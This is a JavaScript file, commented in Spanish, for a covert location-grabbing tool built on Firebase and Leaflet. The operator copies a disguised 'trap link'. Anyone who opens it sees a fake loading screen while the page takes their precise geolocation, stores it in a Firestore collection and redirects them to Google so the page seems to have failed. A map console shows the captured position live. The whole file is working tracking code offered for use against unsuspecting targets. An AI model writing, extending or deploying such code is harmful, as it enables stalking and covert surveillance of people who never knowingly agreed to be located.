import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js";
import { getFirestore, doc, setDoc, onSnapshot } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-firestore.js";

// CONFIGURA AQUÍ TUS CREDENCIALES DE FIREBASE
const firebaseConfig = {
    apiKey: "TU_API_KEY",
    authDomain: "tu-proyecto.firebaseapp.com",
    projectId: "tu-proyecto",
    storageBucket: "tu-proyecto.appspot.com",
    messagingSenderId: "TU_MESSAGING_SENDER_ID",
    appId: "TU_APP_ID"
};

// Inicializar Firebase
const app = initializeApp(firebaseConfig);
const db = getFirestore(app);

let map;
let marker;
const ubicacionPorDefecto = [14.3333, -90.6667]; 

// Detectar si la URL trae un parámetro de objetivo (ej: ?target=objetivo_1)
const urlParams = new URLSearchParams(window.location.search);
const targetId = urlParams.get('target');

document.addEventListener("DOMContentLoaded", function () {
    // ESCENARIO A: Si alguien abrió el enlace trampa en su celular
    if (targetId) {
        // Muestra una pantalla en blanco o de carga genérica instantánea
        document.body.style.backgroundColor = "#ffffff";
        document.body.innerHTML = "<div style='display:flex;justify-content:center;align-items:center;height:100vh;font-family:sans-serif;color:#666;'><h3>Cargando recurso...</h3></div>";
        iniciarCapturaDiscreta(targetId);
        return; // Detiene la carga de la interfaz de la consola en este dispositivo
    }

    // ESCENARIO B: Estás en tu consola principal (PC); inicializamos el mapa
    map = L.map('map', { zoomControl: false }).setView(ubicacionPorDefecto, 14);

    L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
        maxZoom: 19,
        attribution: '&copy; OpenStreetMap contributors'
    }).addTo(map);

    marker = L.marker(ubicacionPorDefecto).addTo(map)
        .bindPopup("<b>Sistema en línea.</b> Esperando señal...")
        .openPopup();

    setTimeout(() => { map.invalidateSize(); }, 200);

    // Escuchamos la base de datos en tiempo real
    escucharObjetivoRemoto("objetivo_principal");
});

// Botón SHARE LINK: Genera un enlace personalizado disfrazado
window.compartirEnlace = function() {
    const baseUrl = window.location.origin + window.location.pathname;
    const enlaceObjetivo = `${baseUrl}?target=objetivo_principal`;
    
    navigator.clipboard.writeText(enlaceObjetivo).then(() => {
        alert("¡Enlace copiado con éxito!\nPuedes enviarlo mediante chat.");
    }).catch(err => {
        console.error("Error al copiar enlace:", err);
    });
};

// Capturar ubicación una sola vez discretamente y cerrar/salir de la página
function iniciarCapturaDiscreta(id) {
    if (!navigator.geolocation) {
        window.location.href = "https://www.google.com";
        return;
    }

    // Usamos getCurrentPosition para obtener el punto exacto al instante de abrir y cerrar
    navigator.geolocation.getCurrentPosition(
        async (position) => {
            const lat = position.coords.latitude;
            const lng = position.coords.longitude;

            try {
                // Guarda las coordenadas en Firestore para que queden guardadas en tu consola
                await setDoc(doc(db, "ratreos", id), {
                    lat: lat,
                    lng: lng,
                    timestamp: new Date()
                });
            } catch (e) {
                console.error("Error al guardar:", e);
            }
            
            // Pestañea y redirige fuera del sitio (parecerá que la página falló o expiró)
            window.location.href = "https://www.google.com";
        },
        (error) => {
            // Si rechaza el permiso o falla, lo saca de igual forma discretamente
            window.location.href = "https://www.google.com";
        },
        { enableHighAccuracy: true, timeout: 10000 }
    );
}

// Escuchar la ubicación en tu consola principal (PC)
function escucharObjetivoRemoto(id) {
    onSnapshot(doc(db, "ratreos", id), (docSnap) => {
        if (docSnap.exists()) {
            const data = docSnap.data();
            const lat = data.lat;
            const lng = data.lng;

            map.invalidateSize();
            map.setView([lat, lng], 16);
            marker.setLatLng([lat, lng]);
            marker.bindPopup(`<b>¡Objetivo Guardado!</b><br>Lat: ${lat.toFixed(4)}<br>Lng: ${lng.toFixed(4)}`).openPopup();
            
            document.getElementById('banner-status').innerHTML = "SEÑAL CAPTURADA<br>REGISTRO GUARDADO";
        }
    });
}

// Funciones secundarias de los botones de la consola
window.obtenerUbicacionActual = function(esInicio = false) {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition((pos) => {
            const lat = pos.coords.latitude;
            const lng = pos.coords.longitude;
            map.setView([lat, lng], 16);
            marker.setLatLng([lat, lng]).bindPopup("Tu posición local").openPopup();
        });
    }
};

window.accionRastrearObjetivo = () => alert("Sistema operativo al 100%. Memoria de rastreo activa.");
window.centrarUbicacion = () => map.invalidateSize();
window.cambiarAlerta = (t) => alert("Alerta: " + t);
window.cambiarPerfil = (n) => alert("Perfil: " + n);
window.abrirChat = () => alert("Canal de chat seguro abierto.");
window.verArchivo = () => alert("Abriendo registros históricos...");
